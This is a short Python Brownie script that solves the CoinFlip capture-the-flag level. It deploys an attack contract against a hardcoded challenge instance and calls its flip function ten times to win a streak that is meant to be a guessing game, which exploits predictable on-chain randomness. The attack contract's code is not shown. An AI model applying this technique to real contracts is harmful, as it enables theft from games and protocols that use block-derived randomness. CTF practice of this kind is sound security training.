from turtle import circle
from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import CoinFlip, CoinFlipAttack

#########################################
# This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.
#########################################

# solve the challenge
def solve_challenge():
    # load challenge
    coinflip = load_challenge(ContractObject=CoinFlip, instance_key='coinflip')
    coinflipattack = CoinFlipAttack.deploy(_from)

    # set the instance of coinflip in coinflipattack 
    # to connect through the interface
    coinflipattack.setInstance('0x7BDa91C53648D2a17352e4055fe6834FAABbFc95', _from)

    # run the flip function 10 times
    for _ in range(10):
        coinflipattack.callFlip(_from | {'allow_revert':True})

    # consecutive wins
    print(f"there's been {coinflip.consecutiveWins()} consecutive wins")

    # check if there's been 10 consecutive wins
    wins_assertion = coinflip.consecutiveWins() == 10
    print(wins_assertion)

    return wins_assertion

def main():
    solve_challenge()
